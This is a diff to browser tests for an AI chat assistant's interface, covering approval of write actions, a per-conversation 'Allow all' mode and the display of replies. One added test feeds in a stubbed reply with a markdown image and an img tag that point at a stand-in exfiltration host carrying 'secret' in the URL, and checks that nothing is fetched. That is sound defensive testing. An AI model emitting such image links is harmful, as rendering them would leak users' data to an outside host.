@@ -88,7 +88,11 @@ test("waits for approval before filing, then files it and says so", async ({ pag
   await ask(page, "file an issue");
   const card = page.getByTestId("chat-approval");
   await expect(card).toContainText(`Open an issue titled “${title}”`);
-  await expect(card.locator("strong")).toHaveText("over chat");
+  // The body as it will be written, not rendered: nothing in it is hidden.
+  await expect(card.getByTestId("chat-card-body")).toHaveText("Written **over chat**.");
+  await expect(
+    card.getByRole("button", { name: `Approve: Open an issue titled “${title}”` }),
+  ).toBeVisible();
   // Nothing written yet: the listing does not have it.
   await page.getByTestId("chat-approve").click();
   await expect(toasts(page)).toContainText("docs(issue): open #");
@@ -157,12 +161,33 @@ test("writes without asking under Allow all", async ({ page }) => {
   await expect(page.getByTestId("chat-approval")).toHaveCount(0);
 });
 
-test("says what failed, and starts afresh on request", async ({ page }) => {
+test("shows a reply's image as a link, so showing it fetches nothing", async ({ page }) => {
+  const fetched: string[] = [];
+  await page.route("http://exfil.invalid/**", (route) => {
+    fetched.push(route.request().url());
+    return route.abort();
+  });
+  stub.enqueue({
+    text: 'Here: ![the data](http://exfil.invalid/leak?d=secret) and <img src="http://exfil.invalid/two">',
+  });
+  await ask(page, "show me");
+  const reply = page.getByTestId("chat-assistant").last();
+  await expect(reply.getByRole("link", { name: "the data" })).toBeVisible();
+  await expect(reply.locator("img")).toHaveCount(0);
+  expect(fetched).toEqual([]);
+});
+
+test("says what failed, and starts afresh on request, asking again", async ({ page }) => {
   stub.enqueue({ status: 500, body: { error: { message: "the model is overloaded" } } });
+  await page.getByTestId("chat-launcher").click();
+  await page.getByTestId("chat-mode").click();
+  await page.getByRole("option", { name: "Allow all" }).click();
   await ask(page, "hello?");
   await expect(page.getByTestId("chat-error")).toContainText("the model is overloaded");
   await page.getByTestId("chat-reset").click();
   await expect(page.getByTestId("chat-empty")).toBeVisible();
+  // "Allow all" was for that conversation.
+  await expect(page.getByTestId("chat-mode")).toContainText("Manual");
 });
 
 test("is not on the pages outside the app", async ({ page }) => {
